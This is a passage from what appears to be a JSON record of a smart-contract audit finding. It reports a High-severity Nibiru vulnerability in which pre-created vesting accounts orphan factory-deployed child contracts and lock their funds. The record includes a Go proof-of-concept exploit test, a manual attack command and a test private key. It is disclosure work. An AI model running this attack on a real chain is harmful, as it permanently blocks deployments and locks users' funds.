crypto.Keccak256Hash(embeds.SmartContract_Factory.DeployedBytecode)\n\ts.Require().Equal(embeds.SmartContract_Factory.DeployedBytecode, deps.App.EvmKeeper.GetCode(deps.Ctx, codeHash))\n\tfactoryBal := deps.App.BankKeeper.GetBalance(deps.Ctx, eth.EthAddrToNibiruAddr(factoryAddr), \"unibi\")\n\ts.Require().Equal(initialFundAmt, factoryBal.Amount.Int64())\n\t// Step-3: Attacker set expected Child contract address as vesting account\n\tattacker := evmtest.NewEthPrivAcc()\n\terr = testapp.FundAccount(\n\t\tdeps.App.BankKeeper,\n\t\tdeps.Ctx,\n\t\tattacker.NibiruAddr,\n\t\tsdk.NewCoins(sdk.NewInt64Coin(\"unibi\", 100000000)),\n\t)\n\t// NOTE: factory does not create any child contract yet, so the expected child address is 1\n\texpectedChildAddr := crypto.CreateAddress(factoryAddr, 1)\n\tvar msgServer vestingtypes.MsgServer\n\tmsgServer = vesting.NewMsgServerImpl(deps.App.AccountKeeper, deps.App.BankKeeper)\n\tlockedCoin := sdk.NewInt64Coin(\"unibi\", 100)\n\tlockResp, err := msgServer.CreatePermanentLockedAccount(deps.Ctx, vestingtypes.NewMsgCreatePermanentLockedAccount(\n\t\tattacker.NibiruAddr,\n\t\teth.EthAddrToNibiruAddr(expectedChildAddr),\n\t\tsdk.Coins{lockedCoin},\n\t))\n\ts.Require().NoError(err)\n\ts.Require().NotNil(lockResp)\n\t// Attacker successfully created a locked account with the expected child address\n\t// Step-4: Victim tries to deploy a child contract\n\tinput, err := embeds.SmartContract_Factory.ABI.Pack(\"makeChild\")\n\ts.Require().NoError(err)\n\texecArgs := evmtest.ArgsExecuteContract{\n\t\tEthAcc:          victim,\n\t\tEthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tContractAddress: &factoryAddr,\n\t\tData:            input,\n\t\tGasPrice:        big.NewInt(1),\n\t\tNonce:           deps.StateDB().GetNonce(victim.EthAddr),\n\t\tGasLimit:        gasLimit,\n\t}\n\tethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)\n\ts.Require().NoError(err)\n\ts.Require().NoError(ethTxMsg.ValidateBasic())\n\ts.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())\n\t_, err = deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n\ts.Require().NoError(err)\n\t// PROOF OF IMPACTS\n\t// IMPACT-1(orphan contract): bytecode actually deployed but code hash is not set for the account because\n\t// the account's type is not EthAccountI, so it's not accessible.\n\tchildAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, expectedChildAddr)\n\ts.Require().Equal(evm.EmptyCodeHash, childAcc.CodeHash)\n\t// IMPACT-2(storage waste): bytecode deployed but no code hash, so the storage is wasted.\n\tchildCodeHash := crypto.Keccak256Hash(embeds.SmartContract_Child.DeployedBytecode)\n\tchildCode := deps.App.EvmKeeper.GetCode(deps.Ctx, childCodeHash)\n\ts.T().Logf(\"storage waste: %d bytes\", len(childCode))\n\t// IMPACT-3(locked fund): There are no way to access the locked fund because the account is not EthAccountI.\n\tacc := deps.App.AccountKeeper.GetAccount(deps.Ctx, eth.EthAddrToNibiruAddr(expectedChildAddr))\n\t_, ok := acc.(exported.VestingAccount)\n\ts.Require().True(ok)\n\tinput, err = embeds.SmartContract_Child.ABI.Pack(\"withdraw\")\n\ts.Require().NoError(err)\n\t// victim tries to withdraw the locked fund, but contract is orphan so no actual state transition happens\n\texecArgs = evmtest.ArgsExecuteContract{\n\t\tEthAcc:          victim,\n\t\tEthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tContractAddress: &expectedChildAddr,\n\t\tData:            input,\n\t\tGasPrice:        big.NewInt(1),\n\t\tNonce:           deps.StateDB().GetNonce(attacker.EthAddr),\n\t\tGasLimit:        gasLimit,\n\t}\n\tethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)\n\ts.Require().NoError(err)\n\t// No actual state transition happens.\n\t// Proof: Debug with breakpoints at https://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L217-L219\n\t// code is nil, so just return without executing the contract\n\tdeps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n}\n```\n\n### Test Code Walkthrough:\n\n1. A victim account is created, which deploys a factory contract along with a small fund (lines 244~289)\n    1. The factory contract deploys each child contract with 999 wei, so it requires a minimal balance. For further details, see `x/evm/embeds/contracts/Factory.sol`.\n2. Verify that the factory contract has been successfully deployed (lines 291298).\n3. Next, the attacker starts the preemption attack. The attacker anticipates the address of the child contract that the factory will deploy next. This is possible because the address generation for contracts is deterministic, based on the deployers address and nonce (line 309).\n4. The attacker creates a `PermanentLockedAccount` at the anticipated child contract address (lines 313319). This immediately disrupts the normal functionality of the first future child deployed by the factory. If the attacker creates vesting accounts across multiple nonces within a for loop, this would effectively block **any future child contract** deployments by the factory. The following steps demonstrate the resulting impacts.\n5. Attempt to deploy a child by calling `makeChild` on the factory contract (lines 322339). The transaction to deploy the child succeeds, but something has gone wrong.\n6. **Impact 1**: Although the bytecode has been stored in the state, no codeHash is mapped to the account. This is due to the internal logic in [`SetAccount`](https://github.com/NibiruChain/nibiru/blob/f3cbcaec58f23c54f6b75204b0c4009856b47250/x/evm/keeper/statedb.go#L114-L116), where the codeHash is only set if the account implements `EthAccountI`. Because the account here is a PermanentLockedAccount, the codeHash is not set. With no mapping between the contract address and the codeHash, the deployed bytecode is permanently inaccessible.\n7. **Impact 2**: Since the bytecode is permanently inaccessible, it wastes storage space in the state. In this PoC, the Child contract bytecode occupies 1,401 bytes, leading to 1,401 bytes of wasted storage.\n8. **Impact 3**: When the factory contract deploys a child, it transfers 999 wei to the new contract. To retrieve these funds, the withdraw function on the child contract should be called. However, because no codeHash exists in the state for the child contracts address, it is inaccessible. As a result, these funds are permanently locked. If this attack targeted large-scale contracts that deploy children with substantial amounts of funds, the potential loss could be significant.\n\n### Manual Reproduce\n\n- Set victim account with the private key `46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c`.\n- Deploy factory contract using victim account.\n- Execute attack command: `nibid tx vesting create-permanent-locked-account nibi136uvp9vz8qplx4rc32fpju5natuacvvgau96c6 10unibi --from attacker`\n    - Ensure the target address is the expected child address of factory contract.\n- Attempt to call `Child.withdraw` from victim account. No state transition will occur, and no funds will be retrievable due to the missing codeHash.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/NibiruChain/nibiru/blob/f3cbcaec58f23c54f6b75204b0c4009856b47250/x/evm/keeper/statedb.go#L130-L134\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/NibiruChain/nibiru/blob/f3cbcaec58f23c54f6b75204b0c4009856b47250/x/evm/keeper/statedb.go#L130-L134\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThis vulnerability allows an attacker to preemptively set a target address as a vesting account, permanently blocking contract deployments by Factory contracts or other users to that address. Once the address is marked as a vesting account, any deployment attempt stores the contract bytecode in the state without creating a codeHash, rendering the contract permanently inaccessible.\n\nFor example, an attacker could target critical ecosystem addresses, such as those planned for LayerZero or Uniswap, and preemptively mark them as vesting accounts. This would effectively orphan the contract bytecode at these addresses, with no way to interact with or access it. The severity is compounded if funds are deployed with the contract, as these would also be irretrievable.\n\nIf exploited, this vulnerability allows an attacker to lock up critical addresses by setting them as vesting accounts, resulting in lost contracts with unreachable bytecode and permanently inaccessible funds. For ecosystem-critical contracts or high-value deployments, this could disrupt functionality and lead to substantial, irreversible losses.\n\n## Proof of Concept\n\nThe following commit demonstrates the vulnerability through a step-by-step exploit:\n\n- Commit link: https://github.com/zsystm/nibiru-fork-for-audit/commit/9ea38e3e3a6bbc64bcbbd4271ca0f825d3a0259a (private repo)\n- Description: Key aspects of this vulnerability are demonstrated in `TestVestingAccountPreemptionAttack`, which provides a proof of concept for the vulnerability in the form of a test scenario.\n\nPlease provide your GitHub handles, and I will grant access to the private repository.\n\nFor quick reference before access permissions are granted, Ive included a core snippet of the reproduction code below.\n```go\nfunc (s *Suite) TestVestingAccountPreemptionAttack() {\n\tdeps := evmtest.NewTestDeps()\n\t// Step-1: Set up the deterministic victim account\n\tprivKeyE, _ := crypto.HexToECDSA(\"46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c\")\n\tprivKey := &ethsecp256k1.PrivKey{\n\t\tKey: crypto.FromECDSA(privKeyE),\n\t}\n\tethAddr := crypto.PubkeyToAddress(privKeyE.PublicKey)\n\tdeps.Sender = evmtest.EthPrivKeyAcc{\n\t\tEthAddr:       ethAddr,\n\t\tNibiruAddr:    eth.EthAddrToNibiruAddr(ethAddr),\n\t\tPrivKey:       privKey,\n\t\tKeyringSigner: evmtest.NewSigner(privKey),\n\t}\n\tvictim := deps.Sender\n\tfundedAmount := evm.NativeToWei(big.NewInt(100))\n\tfundedCoin := sdk.NewCoins(sdk.NewCoin(\"unibi\", sdk.NewIntFromBigInt(fundedAmount)))\n\ts.Require().NoError(testapp.FundModuleAccount(deps.App.BankKeeper, deps.Ctx, authtypes.FeeCollectorName, fundedCoin))\n\ts.Require().NoError(testapp.FundAccount(deps.App.BankKeeper, deps.Ctx, victim.NibiruAddr, fundedCoin))\n\t// Step-2: Victim account deploys a Factory contract\n\tgasLimit := big.NewInt(3_000_000)\n\tinitialFundAmt := int64(10)\n\tinitialFundToFactory := evm.NativeToWei(big.NewInt(initialFundAmt))\n\tcreateArgs := evmtest.ArgsCreateContract{\n\t\tEthAcc:        victim,\n\t\tEthChainIDInt: deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tGasPrice:      big.NewInt(1),\n\t\tNonce:         deps.StateDB().GetNonce(victim.EthAddr),\n\t\tGasLimit:      gasLimit,\n\t\t// Factory send 999 wei when deploy Child contract. See x/evm/embeds/contracts/Factory.sol\n\t\tValue: initialFundToFactory,\n\t}\n\tethTxMsg, err := evmtest.DeployFactoryMsgEthereumTx(createArgs)\n\ts.Require().NoError(err)\n\ts.Require().NoError(ethTxMsg.ValidateBasic())\n\ts.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())\n\tresp, err := deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n\ts.Require().NoError(\n\t\terr,\n\t\t\"resp: %s\\nblock header: %s\",\n\t\tresp,\n\t\tdeps.Ctx.BlockHeader().ProposerAddress,\n\t)\n\ts.Require().Empty(resp.VmError)\n\t// Check if the Factory contract is deployed\n\tfactoryAddr := crypto.CreateAddress(gethcommon.HexToAddress(victim.EthAddr.String()), 0)\n\tfactoryContractAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, factoryAddr)\n\ts.Require().NotNil(factoryContractAcc)\n\ts.Require().True(factoryContractAcc.IsContract())\n\tcodeHash := crypto.Keccak256Hash(embeds.SmartContract_Factory.DeployedBytecode)\n\ts.Require().Equal(embeds.SmartContract_Factory.DeployedBytecode, deps.App.EvmKeeper.GetCode(deps.Ctx, codeHash))\n\tfactoryBal := deps.App.BankKeeper.GetBalance(deps.Ctx, eth.EthAddrToNibiruAddr(factoryAddr), \"unibi\")\n\ts.Require().Equal(initialFundAmt, factoryBal.Amount.Int64())\n\t// Step-3: Attacker set expected Child contract address as vesting account\n\tattacker := evmtest.NewEthPrivAcc()\n\terr = testapp.FundAccount(\n\t\tdeps.App.BankKeeper,\n\t\tdeps.Ctx,\n\t\tattacker.NibiruAddr,\n\t\tsdk.NewCoins(sdk.NewInt64Coin(\"unibi\", 100000000)),\n\t)\n\t// NOTE: factory does not create any child contract yet, so the expected child address is 1\n\texpectedChildAddr := crypto.CreateAddress(factoryAddr, 1)\n\tvar msgServer vestingtypes.MsgServer\n\tmsgServer = vesting.NewMsgServerImpl(deps.App.AccountKeeper, deps.App.BankKeeper)\n\tlockedCoin := sdk.NewInt64Coin(\"unibi\", 100)\n\tlockResp, err := msgServer.CreatePermanentLockedAccount(deps.Ctx, vestingtypes.NewMsgCreatePermanentLockedAccount(\n\t\tattacker.NibiruAddr,\n\t\teth.EthAddrToNibiruAddr(expectedChildAddr),\n\t\tsdk.Coins{lockedCoin},\n\t))\n\ts.Require().NoError(err)\n\ts.Require().NotNil(lockResp)\n\t// Attacker successfully created a locked account with the expected child address\n\t// Step-4: Victim tries to deploy a child contract\n\tinput, err := embeds.SmartContract_Factory.ABI.Pack(\"makeChild\")\n\ts.Require().NoError(err)\n\texecArgs := evmtest.ArgsExecuteContract{\n\t\tEthAcc:          victim,\n\t\tEthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tContractAddress: &factoryAddr,\n\t\tData:            input,\n\t\tGasPrice:        big.NewInt(1),\n\t\tNonce:           deps.StateDB().GetNonce(victim.EthAddr),\n\t\tGasLimit:        gasLimit,\n\t}\n\tethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)\n\ts.Require().NoError(err)\n\ts.Require().NoError(ethTxMsg.ValidateBasic())\n\ts.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())\n\t_, err = deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n\ts.Require().NoError(err)\n\t// PROOF OF IMPACTS\n\t// IMPACT-1(orphan contract): bytecode actually deployed but code hash is not set for the account because\n\t// the account's type is not EthAccountI, so it's not accessible.\n\tchildAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, expectedChildAddr)\n\ts.Require().Equal(evm.EmptyCodeHash, childAcc.CodeHash)\n\t// IMPACT-2(storage waste): bytecode deployed but no code hash, so the storage is wasted.\n\tchildCodeHash := crypto.Keccak256Hash(embeds.SmartContract_Child.DeployedBytecode)\n\tchildCode := deps.App.EvmKeeper.GetCode(deps.Ctx, childCodeHash)\n\ts.T().Logf(\"storage waste: %d bytes\", len(childCode))\n\t// IMPACT-3(locked fund): There are no way to access the locked fund because the account is not EthAccountI.\n\tacc := deps.App.AccountKeeper.GetAccount(deps.Ctx, eth.EthAddrToNibiruAddr(expectedChildAddr))\n\t_, ok := acc.(exported.VestingAccount)\n\ts.Require().True(ok)\n\tinput, err = embeds.SmartContract_Child.ABI.Pack(\"withdraw\")\n\ts.Require().NoError(err)\n\t// victim tries to withdraw the locked fund, but contract is orphan so no actual state transition happens\n\texecArgs = evmtest.ArgsExecuteContract{\n\t\tEthAcc:          victim,\n\t\tEthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tContractAddress: &expectedChildAddr,\n\t\tData:            input,\n\t\tGasPrice:        big.NewInt(1),\n\t\tNonce:           deps.StateDB().GetNonce(attacker.EthAddr),\n\t\tGasLimit:        gasLimit,\n\t}\n\tethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)\n\ts.Require().NoError(err)\n\t// No actual state transition happens.\n\t// Proof: Debug with breakpoints at https://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L217-L219\n\t// code is nil, so just return without executing the contract\n\tdeps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n}\n```\n\n### Test Code Walkthrough:\n\n1. A victim account is created, which deploys a factory contract along with a small fund (lines 244~289)\n    1. The factory contract deploys each child contract with 999 wei, so it requires a minimal balance. For further details, see `x/evm/embeds/contracts/Factory.sol`.\n2. Verify that the factory contract has been successfully deployed (lines 291298).\n3. Next, the attacker starts the preemption attack. The attacker anticipates the address of the child contract that the factory will deploy next. This is possible because the address generation for contracts is deterministic, based on the deployers address and nonce (line 309).\n4. The attacker creates a `PermanentLockedAccount` at the anticipated child contract address (lines 313319). This immediately disrupts the normal functionality of the first future child deployed by the factory. If the attacker creates vesting accounts across multiple nonces within a for loop, this would effectively block **any future child contract** deployments by the factory. The following steps demonstrate the resulting impacts.\n5. Attempt to deploy a child by calling `makeChild` on the factory contract (lines 322339). The transaction to deploy the child succeeds, but something has gone wrong.\n6. **Impact 1**: Although the bytecode has been stored in the state, no codeHash is mapped to the account. This is due to the internal logic in [`SetAccount`](https://github.com/NibiruChain/nibiru/blob/f3cbcaec58f23c54f6b75204b0c4009856b47250/x/evm/keeper/statedb.go#L114-L116), where the codeHash is only set if the account implements `EthAccountI`. Because the account here is a PermanentLockedAccount, the codeHash is not set. With no mapping between the contract address and the codeHash, the deployed bytecode is permanently inaccessible.\n7. **Impact 2**: Since the bytecode is permanently inaccessible, it wastes storage space in the state. In this PoC, the Child contract bytecode occupies 1,401 bytes, leading to 1,401 bytes of wasted storage.\n8. **Impact 3**: When the factory contract deploys a child, it transfers 999 wei to the new contract. To retrieve these funds, the withdraw function on the child contract should be called. However, because no codeHash exists in the state for the child contracts address, it is inaccessible. As a result, these funds are permanently locked. If this attack targeted large-scale contracts that deploy children with substantial amounts of funds, the potential loss could be significant.\n\n### Manual Reproduce\n\n- Set victim account with the private key `46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c`.\n- Deploy factory contract using victim account.\n- Execute attack command: `nibid tx vesting create-permanent-locked-account nibi136uvp9vz8qplx4rc32fpju5natuacvvgau96c6 10unibi --from attacker`\n    - Ensure the target address is the expected child address of factory contract.\n- Attempt to call `Child.withdraw` from victim account. No state transition will occur, and no funds will be retrievable due to the missing codeHash.\n\n## Recommended mitigation steps\n\nThere are two potential approaches for patching this vulnerability: a fundamental patch and a more practical one.\n\nThe fundamental approach involves completely separating the Cosmos address system from the EVM address system. Currently, the bytes of an EVM address are directly used as Cosmos addresses, allowing them to share state, which enables this vulnerability. By fully decoupling these address systems, this issue could be prevented entirely. However, this would require a major design overhaul and is thus not a realistic solution.\n\nThe more practical approach is to disable the Vesting Account feature at the ante handler level. While this would prevent the use of vesting features, it is likely a necessary trade-off for security reasons.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/NibiruChain/nibiru/blob/f3cbcaec58f23c54f6b75204b0c4009856b47250/x/evm/keeper/statedb.go#L130-L134\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThis vulnerability allows an attacker to preemptively set a target address as a vesting account, permanently blocking contract deployments by Factory contracts or other users to that address. Once the address is marked as a vesting account, any deployment attempt stores the contract bytecode in the state without creating a codeHash, rendering the contract permanently inaccessible.\n\nFor example, an attacker could target critical ecosystem addresses, such as those planned for LayerZero or Uniswap, and preemptively mark them as vesting accounts. This would effectively orphan the contract bytecode at these addresses, with no way to interact with or access it. The severity is compounded if funds are deployed with the contract, as these would also be irretrievable.\n\nIf exploited, this vulnerability allows an attacker to lock up critical addresses by setting them as vesting accounts, resulting in lost contracts with unreachable bytecode and permanently inaccessible funds. For ecosystem-critical contracts or high-value deployments, this could disrupt functionality and lead to substantial, irreversible losses.\n\n## Proof of Concept\n\nThe following commit demonstrates the vulnerability through a step-by-step exploit:\n\n- Commit link: https://github.com/zsystm/nibiru-fork-for-audit/commit/9ea38e3e3a6bbc64bcbbd4271ca0f825d3a0259a (private repo)\n- Description: Key aspects of this vulnerability are demonstrated in `TestVestingAccountPreemptionAttack`, which provides a proof of concept for the vulnerability in the form of a test scenario.\n\nPlease provide your GitHub handles, and I will grant access to the private repository.\n\nFor quick reference before access permissions are granted, Ive included a core snippet of the reproduction code below.\n```go\nfunc (s *Suite) TestVestingAccountPreemptionAttack() {\n\tdeps := evmtest.NewTestDeps()\n\t// Step-1: Set up the deterministic victim account\n\tprivKeyE, _ := crypto.HexToECDSA(\"46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c\")\n\tprivKey := &ethsecp256k1.PrivKey{\n\t\tKey: crypto.FromECDSA(privKeyE),\n\t}\n\tethAddr := crypto.PubkeyToAddress(privKeyE.PublicKey)\n\tdeps.Sender = evmtest.EthPrivKeyAcc{\n\t\tEthAddr:       ethAddr,\n\t\tNibiruAddr:    eth.EthAddrToNibiruAddr(ethAddr),\n\t\tPrivKey:       privKey,\n\t\tKeyringSigner: evmtest.NewSigner(privKey),\n\t}\n\tvictim := deps.Sender\n\tfundedAmount := evm.NativeToWei(big.NewInt(100))\n\tfundedCoin := sdk.NewCoins(sdk.NewCoin(\"unibi\", sdk.NewIntFromBigInt(fundedAmount)))\n\ts.Require().NoError(testapp.FundModuleAccount(deps.App.BankKeeper, deps.Ctx, authtypes.FeeCollectorName, fundedCoin))\n\ts.Require().NoError(testapp.FundAccount(deps.App.BankKeeper, deps.Ctx, victim.NibiruAddr, fundedCoin))\n\t// Step-2: Victim account deploys a Factory contract\n\tgasLimit := big.NewInt(3_000_000)\n\tinitialFundAmt := int64(10)\n\tinitialFundToFactory := evm.NativeToWei(big.NewInt(initialFundAmt))\n\tcreateArgs := evmtest.ArgsCreateContract{\n\t\tEthAcc:        victim,\n\t\tEthChainIDInt: deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tGasPrice:      big.NewInt(1),\n\t\tNonce:         deps.StateDB().GetNonce(victim.EthAddr),\n\t\tGasLimit:      gasLimit,\n\t\t// Factory send 999 wei when deploy Child contract. See x/evm/embeds/contracts/Factory.sol\n\t\tValue: initialFundToFactory,\n\t}\n\tethTxMsg, err := evmtest.DeployFactoryMsgEthereumTx(createArgs)\n\ts.Require().NoError(err)\n\ts.Require().NoError(ethTxMsg.ValidateBasic())\n\ts.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())\n\tresp, err := deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n\ts.Require().NoError(\n\t\terr,\n\t\t\"resp: %s\\nblock header: %s\",\n\t\tresp,\n\t\tdeps.Ctx.BlockHeader().ProposerAddress,\n\t)\n\ts.Require().Empty(resp.VmError)\n\t// Check if the Factory contract is deployed\n\tfactoryAddr := crypto.CreateAddress(gethcommon.HexToAddress(victim.EthAddr.String()), 0)\n\tfactoryContractAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, factoryAddr)\n\ts.Require().NotNil(factoryContractAcc)\n\ts.Require().True(factoryContractAcc.IsContract())\n\tcodeHash := crypto.Keccak256Hash(embeds.SmartContract_Factory.DeployedBytecode)\n\ts.Require().Equal(embeds.SmartContract_Factory.DeployedBytecode, deps.App.EvmKeeper.GetCode(deps.Ctx, codeHash))\n\tfactoryBal := deps.App.BankKeeper.GetBalance(deps.Ctx, eth.EthAddrToNibiruAddr(factoryAddr), \"unibi\")\n\ts.Require().Equal(initialFundAmt, factoryBal.Amount.Int64())\n\t// Step-3: Attacker set expected Child contract address as vesting account\n\tattacker := evmtest.NewEthPrivAcc()\n\terr = testapp.FundAccount(\n\t\tdeps.App.BankKeeper,\n\t\tdeps.Ctx,\n\t\tattacker.NibiruAddr,\n\t\tsdk.NewCoins(sdk.NewInt64Coin(\"unibi\", 100000000)),\n\t)\n\t// NOTE: factory does not create any child contract yet, so the expected child address is 1\n\texpectedChildAddr := crypto.CreateAddress(factoryAddr, 1)\n\tvar msgServer vestingtypes.MsgServer\n\tmsgServer = vesting.NewMsgServerImpl(deps.App.AccountKeeper, deps.App.BankKeeper)\n\tlockedCoin := sdk.NewInt64Coin(\"unibi\", 100)\n\tlockResp, err := msgServer.CreatePermanentLockedAccount(deps.Ctx, vestingtypes.NewMsgCreatePermanentLockedAccount(\n\t\tattacker.NibiruAddr,\n\t\teth.EthAddrToNibiruAddr(expectedChildAddr),\n\t\tsdk.Coins{lockedCoin},\n\t))\n\ts.Require().NoError(err)\n\ts.Require().NotNil(lockResp)\n\t// Attacker successfully created a locked account with the expected child address\n\t// Step-4: Victim tries to deploy a child contract\n\tinput, err := embeds.SmartContract_Factory.ABI.Pack(\"makeChild\")\n\ts.Require().NoError(err)\n\texecArgs := evmtest.ArgsExecuteContract{\n\t\tEthAcc:          victim,\n\t\tEthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tContractAddress: &factoryAddr,\n\t\tData:            input,\n\t\tGasPrice:        big.NewInt(1),\n\t\tNonce:           deps.StateDB().GetNonce(victim.EthAddr),\n\t\tGasLimit:        gasLimit,\n\t}\n\tethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)\n\ts.Require().NoError(err)\n\ts.Require().NoError(ethTxMsg.ValidateBasic())\n\ts.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())\n\t_, err = deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n\ts.Require().NoError(err)\n\t// PROOF OF IMPACTS\n\t// IMPACT-1(orphan contract): bytecode actually deployed but code hash is not set for the account because\n\t// the account's type is not EthAccountI, so it's not accessible.\n\tchildAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, expectedChildAddr)\n\ts.Require().Equal(evm.EmptyCodeHash, childAcc.CodeHash)\n\t// IMPACT-2(storage waste): bytecode deployed but no code hash, so the storage is wasted.\n\tchildCodeHash := crypto.Keccak256Hash(embeds.SmartContract_Child.DeployedBytecode)\n\tchildCode := deps.App.EvmKeeper.GetCode(deps.Ctx, childCodeHash)\n\ts.T().Logf(\"storage waste: %d bytes\", len(childCode))\n\t// IMPACT-3(locked fund): There are no way to access the locked fund because the account is not EthAccountI.\n\tacc := deps.App.AccountKeeper.GetAccount(deps.Ctx, eth.EthAddrToNibiruAddr(expectedChildAddr))\n\t_, ok := acc.(exported.VestingAccount)\n\ts.Require().True(ok)\n\tinput, err = embeds.SmartContract_Child.ABI.Pack(\"withdraw\")\n\ts.Require().NoError(err)\n\t// victim tries to withdraw the locked fund, but contract is orphan so no actual state transition happens\n\texecArgs = evmtest.ArgsExecuteContract{\n\t\tEthAcc:          victim,\n\t\tEthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tContractAddress: &expectedChildAddr,\n\t\tData:            input,\n\t\tGasPrice:        big.NewInt(1),\n\t\tNonce:           deps.StateDB().GetNonce(attacker.EthAddr),\n\t\tGasLimit:        gasLimit,\n\t}\n\tethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)\n\ts.Require().NoError(err)\n\t// No actual state transition happens.\n\t// Proof: Debug with breakpoints at https://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L217-L219\n\t// code is nil, so just return without executing the contract\n\tdeps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n}\n```\n\n### Test Code Walkthrough:\n\n1. A victim account is created, which deploys a factory contract along with a small fund (lines 244~289)\n    1. The factory contract deploys each child contract with 999 wei, so it requires a minimal balance. For further details, see `x/evm/embeds/contracts/Factory.sol`.\n2. Verify that the factory contract has been successfully deployed (lines 291298).\n3. Next, the attacker starts the preemption attack. The attacker anticipates the address of the child contract that the factory will deploy next. This is possible because the address generation for contracts is deterministic, based on the deployers address and nonce (line 309).\n4. The attacker creates a `PermanentLockedAccount` at the anticipated child contract address (lines 313319). This immediately disrupts the normal functionality of the first future child deployed by the factory. If the attacker creates vesting accounts across multiple nonces within a for loop, this would effectively block **any future child contract** deployments by the factory. The following steps demonstrate the resulting impacts.\n5. Attempt to deploy a child by calling `makeChild` on the factory contract (lines 322339). The transaction to deploy the child succeeds, but something has gone wrong.\n6. **Impact 1**: Although the bytecode has been stored in the state, no codeHash is mapped to the account. This is due to the internal logic in [`SetAccount`](https://github.com/NibiruChain/nibiru/blob/f3cbcaec58f23c54f6b75204b0c4009856b47250/x/evm/keeper/statedb.go#L114-L116), where the codeHash is only set if the account implements `EthAccountI`. Because the account here is a PermanentLockedAccount, the codeHash is not set. With no mapping between the contract address and the codeHash, the deployed bytecode is permanently inaccessible.\n7. **Impact 2**: Since the bytecode is permanently inaccessible, it wastes storage space in the state. In this PoC, the Child contract bytecode occupies 1,401 bytes, leading to 1,401 bytes of wasted storage.\n8. **Impact 3**: When the factory contract deploys a child, it transfers 999 wei to the new contract. To retrieve these funds, the withdraw function on the child contract should be called. However, because no codeHash exists in the state for the child contracts address, it is inaccessible. As a result, these funds are permanently locked. If this attack targeted large-scale contracts that deploy children with substantial amounts of funds, the potential loss could be significant.\n\n### Manual Reproduce\n\n- Set victim account with the private key `46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c`.\n- Deploy factory contract using victim account.\n- Execute attack command: `nibid tx vesting create-permanent-locked-account nibi136uvp9vz8qplx4rc32fpju5natuacvvgau96c6 10unibi --from attacker`\n    - Ensure the target address is the expected child address of factory contract.\n- Attempt to call `Child.withdraw` from victim account. No state transition will occur, and no funds will be retrievable due to the missing codeHash.\n\n## Recommended mitigation steps\n\nThere are two potential approaches for patching this vulnerability: a fundamental patch and a more practical one.\n\nThe fundamental approach involves completely separating the Cosmos address system from the EVM address system. Currently, the bytes of an EVM address are directly used as Cosmos addresses, allowing them to share state, which enables this vulnerability. By fully decoupling these address systems, this issue could be prevented entirely. However, this would require a major design overhaul and is thus not a realistic solution.\n\nThe more practical approach is to disable the Vesting Account feature at the ante handler level. While this would prevent the use of vesting features, it is likely a necessary trade-off for security reasons."}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": 